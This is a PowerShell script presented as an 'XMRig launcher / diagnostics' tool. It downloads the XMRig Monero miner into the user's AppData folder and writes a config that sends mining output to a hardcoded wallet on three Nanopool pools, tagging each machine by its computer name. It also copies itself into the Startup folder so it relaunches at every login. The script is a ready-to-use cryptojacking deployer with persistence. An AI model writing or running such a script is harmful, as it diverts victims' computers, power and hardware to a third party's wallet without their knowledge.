# XMRig Launcher / Diagnostics
# Intended for Windows PCs you own or administer.
# Run once as the target Windows user.

$ErrorActionPreference = "Stop"

$Version = "6.22.0"
$Wallet = "83ks8iCJFod4JH29c1ZkaNJJUJgsrEM7ePP6YxGUKaFY3VHTUs3xRPpVW7DDgkDAj4NfUg9yT4c7pC4jRUBX1mUYAZEkCwM"
$PrimaryPool = "xmr-asia1.nanopool.org:10343"

$WorkDir = Join-Path $env:APPDATA "XMRig"
$XMRigPath = Join-Path $WorkDir "xmrig.exe"
$ConfigPath = Join-Path $WorkDir "config.json"
$ZipPath = Join-Path $WorkDir "xmrig.zip"
$LogPath = Join-Path $WorkDir "launcher.log"

$DownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$Version/xmrig-$Version-msvc-win64.zip"

New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null

function Write-Log {
    param([string]$Message)
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Message
    Add-Content -LiteralPath $LogPath -Value $line
    Write-Host $line
}

function Get-ComputerId {
    try {
        $name = $env:COMPUTERNAME
        if ([string]::IsNullOrWhiteSpace($name)) { return "UNKNOWN-PC" }
        return $name.Trim()
    } catch {
        return "UNKNOWN-PC"
    }
}

function Test-XMRigRunning {
    return $null -ne (Get-Process -Name "xmrig" -ErrorAction SilentlyContinue)
}

try {
    Write-Log "========== Launcher started =========="
    Write-Log "Computer: $(Get-ComputerId)"
    Write-Log "User: $env:USERNAME"
    Write-Log "OS: $([Environment]::OSVersion.VersionString)"
    Write-Log "PowerShell: $($PSVersionTable.PSVersion)"
    Write-Log "64-bit OS: $([Environment]::Is64BitOperatingSystem)"

    if (Test-XMRigRunning) {
        Write-Log "XMRig is already running. Nothing to start."
        exit 0
    }

    if (-not (Test-Path -LiteralPath $XMRigPath)) {
        Write-Log "XMRig not found. Downloading $Version..."

        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        } catch {}

        Invoke-WebRequest `
            -Uri $DownloadUrl `
            -OutFile $ZipPath `
            -UseBasicParsing

        if (-not (Test-Path -LiteralPath $ZipPath)) {
            throw "Download completed without creating the ZIP file."
        }

        $zipSize = (Get-Item -LiteralPath $ZipPath).Length
        Write-Log "Downloaded ZIP: $zipSize bytes"

        $ExtractDir = Join-Path $WorkDir "_extract"
        if (Test-Path -LiteralPath $ExtractDir) {
            Remove-Item -LiteralPath $ExtractDir -Recurse -Force
        }
        New-Item -ItemType Directory -Path $ExtractDir -Force | Out-Null

        Write-Log "Extracting archive..."
        Expand-Archive -LiteralPath $ZipPath -DestinationPath $ExtractDir -Force

        $Found = Get-ChildItem -LiteralPath $ExtractDir -Filter "xmrig.exe" -Recurse -File |
                 Select-Object -First 1

        if ($null -eq $Found) {
            throw "xmrig.exe was not found after extraction."
        }

        Write-Log "Found XMRig at: $($Found.FullName)"

        Copy-Item -LiteralPath $Found.FullName -Destination $XMRigPath -Force

        # Copy supporting DLL/config files from the same directory when present.
        $SourceDir = Split-Path -Parent $Found.FullName
        Get-ChildItem -LiteralPath $SourceDir -File | ForEach-Object {
            if ($_.Name -ne "xmrig.exe") {
                Copy-Item -LiteralPath $_.FullName -Destination (Join-Path $WorkDir $_.Name) -Force
            }
        }

        Remove-Item -LiteralPath $ExtractDir -Recurse -Force
        Remove-Item -LiteralPath $ZipPath -Force -ErrorAction SilentlyContinue

        Write-Log "XMRig installation files prepared."
    }
    else {
        Write-Log "XMRig already exists."
    }

    if (-not (Test-Path -LiteralPath $XMRigPath)) {
        throw "XMRig executable is missing: $XMRigPath"
    }

    $WorkerId = Get-ComputerId

    $Config = @{
        autosave = $false
        background = $false
        colors = $false
        http = @{
            enabled = $true
            host = "127.0.0.1"
            port = 8080
            "access-token" = $null
            restricted = $true
        }
        cpu = @{
            enabled = $true
            "huge-pages" = $false
            "max-threads-hint" = 50
            priority = 1
        }
        pools = @(
            @{
                algo = "rx/0"
                coin = "monero"
                url = $PrimaryPool
                user = $Wallet
                pass = "x"
                tls = $true
                keepalive = $true
                "worker-id" = $WorkerId
            },
            @{
                algo = "rx/0"
                coin = "monero"
                url = "xmr-jp1.nanopool.org:10343"
                user = $Wallet
                pass = "x"
                tls = $true
                keepalive = $true
                "worker-id" = $WorkerId
            },
            @{
                algo = "rx/0"
                coin = "monero"
                url = "xmr-au1.nanopool.org:10343"
                user = $Wallet
                pass = "x"
                tls = $true
                keepalive = $true
                "worker-id" = $WorkerId
            }
        )
    }

    $Config | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath $ConfigPath -Encoding UTF8
    Write-Log "Config written. Worker ID: $WorkerId"

    # Use the current user's Startup folder. This starts after that user logs in.
    $StartupDir = [Environment]::GetFolderPath("Startup")
    $StartupScript = Join-Path $StartupDir "XMRig-Launcher.ps1"

    $CurrentScript = $MyInvocation.MyCommand.Path

    if ($CurrentScript -and (Test-Path -LiteralPath $CurrentScript)) {
        Copy-Item -LiteralPath $CurrentScript -Destination $StartupScript -Force
        Write-Log "Startup launcher installed: $StartupScript"
    }
    else {
        Write-Log "Startup launcher not installed because the script has no file path."
    }

    if (Test-XMRigRunning) {
        Write-Log "XMRig became active before launch. Exiting."
        exit 0
    }

    Write-Log "Starting XMRig..."
    $process = Start-Process `
        -FilePath $XMRigPath `
        -ArgumentList "--config=`"$ConfigPath`"" `
        -WorkingDirectory $WorkDir `
        -PassThru

    Start-Sleep -Seconds 3

    if ($process.HasExited) {
        Write-Log "XMRig exited immediately. Exit code: $($process.ExitCode)"
        Write-Log "Run xmrig.exe manually from $WorkDir to see its console error."
        exit 1
    }

    Write-Log "XMRig started successfully. PID: $($process.Id)"
    Write-Log "Worker ID: $WorkerId"
    Write-Log "========== Launcher finished =========="
}
catch {
    Write-Log "ERROR: $($_.Exception.Message)"
    Write-Log "Line: $($_.InvocationInfo.ScriptLineNumber)"
    exit 1
}
